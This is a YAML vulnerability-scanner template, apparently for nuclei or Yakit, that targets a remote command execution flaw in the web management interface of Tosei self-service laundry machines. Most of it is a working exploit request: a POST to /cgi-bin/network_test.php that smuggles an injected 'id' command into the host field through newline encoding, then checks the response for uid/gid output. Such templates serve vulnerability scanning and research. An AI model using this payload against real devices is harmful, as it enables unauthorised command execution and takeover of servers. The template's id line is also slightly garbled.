content:
id: osei network_test.php程命令执行漏洞

info:
  name: Tosei network_test.php远程命令执行漏洞
  author: Deans
  severity: high
  description: Tosei 自助洗衣机 是日本 Tosei 公司的一个产品。Tosei 自助洗衣机 web 管理端存在安全漏洞，攻击者利用该漏洞可以通过 network_test.php 的命令执行,在服务器任意执行代码，获取服务器权限，进而控制整个服务器。
  reference:
  - https://github.com/
  - https://cve.mitre.org/
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true
  yakit-info:
    sign: 2195dbbbdbe1670d06f8a82899537b06

http:
- raw:
  - |-
    @timeout: 30s
    POST /cgi-bin/network_test.php HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 26
    Connection: close
    Upgrade-Insecure-Requests: 1

    host=%0aid%0a&command=ping

  max-redirects: 3
  disable-cookie: true
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - uid=
    - gid=
    condition: and
